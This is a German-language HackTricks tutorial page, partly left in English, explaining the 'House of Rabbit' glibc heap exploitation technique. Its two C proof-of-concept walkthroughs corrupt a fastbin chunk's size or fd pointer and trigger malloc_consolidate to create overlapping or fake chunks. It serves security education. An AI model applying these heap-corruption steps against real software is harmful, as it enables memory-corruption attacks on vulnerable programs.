# Haus des Kaninchens

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}

### Anforderungen

1. **F√§higkeit, den fastbin fd-Zeiger oder die Gr√∂√üe zu √§ndern**: Dies bedeutet, dass Sie den Vorw√§rtszeiger eines Chunks im fastbin oder seine Gr√∂√üe √§ndern k√∂nnen.
2. **F√§higkeit, `malloc_consolidate` auszul√∂sen**: Dies kann durch Zuweisen eines gro√üen Chunks oder durch Zusammenf√ºhren des Top-Chunks erfolgen, was dazu f√ºhrt, dass der Heap Chunks konsolidiert.

### Ziele

1. **√úberlappende Chunks erstellen**: Um einen Chunk mit einem anderen zu √ºberlappen, um weitere Heap-Manipulationen zu erm√∂glichen.
2. **F√§lschung von Fake-Chunks**: Um den Allocator dazu zu bringen, einen gef√§lschten Chunk w√§hrend der Heap-Operationen als legitimen Chunk zu behandeln.

## Schritte des Angriffs

### POC 1: √Ñndern der Gr√∂√üe eines fastbin-Chunks

**Ziel**: Erstellen eines √ºberlappenden Chunks durch Manipulation der Gr√∂√üe eines fastbin-Chunks.

* **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Schritt 2: Freigeben von Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Wir geben beide Chunks frei und f√ºgen sie der fastbin-Liste hinzu.

* **Schritt 3: Gr√∂√üen√§nderung des Chunks**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Schritt 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk triggers the `malloc_consolidate` function, merging small chunks in the fast bin. The manipulated size of `chunk1` causes it to overlap with `chunk2`.

After consolidation, `chunk1` overlaps with `chunk2`, allowing for further exploitation.

### POC 2: Modify the `fd` pointer

**Objective**: Create a fake chunk by manipulating the fast bin `fd` pointer.

* **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Erkl√§rung**: Wir allozieren zwei Chunks, einen kleineren und einen gr√∂√üeren, um den Heap f√ºr den Fake Chunk einzurichten.

* **Schritt 2: Fake Chunk erstellen**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Schritt 3: `chunk1` freigeben**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Erkl√§rung**: Wir geben `chunk1` frei und f√ºgen ihn der fastbin-Liste hinzu.

* **Schritt 4: √Ñndern Sie `fd` von `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Erkl√§rung**: Wir √§ndern den Vorw√§rtszeiger (`fd`) von `chunk1` so, dass er auf unseren gef√§lschten Chunk innerhalb von `chunk2` zeigt.

* **Schritt 5: `malloc_consolidate` ausl√∂sen**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Die erneute Zuweisung eines gro√üen Chunks l√∂st `malloc_consolidate` aus, das den Fake-Chunk verarbeitet.

Der Fake-Chunk wird Teil der Fastbin-Liste, was ihn zu einem legitimen Chunk f√ºr weitere Ausnutzungen macht.

### Zusammenfassung

Die **House of Rabbit**-Technik beinhaltet entweder die Modifizierung der Gr√∂√üe eines Fastbin-Chunks, um √ºberlappende Chunks zu erstellen, oder die Manipulation des `fd`-Zeigers, um Fake-Chunks zu erstellen. Dies erm√∂glicht es Angreifern, legitime Chunks im Heap zu f√§lschen und verschiedene Formen der Ausnutzung zu erm√∂glichen. Das Verst√§ndnis und die praktische Anwendung dieser Schritte werden Ihre F√§higkeiten in der Heap-Ausnutzung verbessern.
